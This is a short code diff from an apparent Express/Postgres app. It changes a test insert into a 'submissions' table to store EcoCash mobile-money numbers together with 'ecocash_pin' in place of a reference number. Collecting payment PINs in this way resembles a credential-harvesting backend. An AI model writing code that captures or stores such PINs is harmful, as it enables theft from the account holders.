@@ -47,7 +47,7 @@ app.get("/create-table", async (req, res) => {
 app.get("/save-test", async (req, res) => {
   try {
     await pool.query(
-      "INSERT INTO submissions (ecocash_number, reference_number) VALUES ($1,$2)",
+      "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1,$2)",
       ["0771234567", "TEST123"]
     );
 
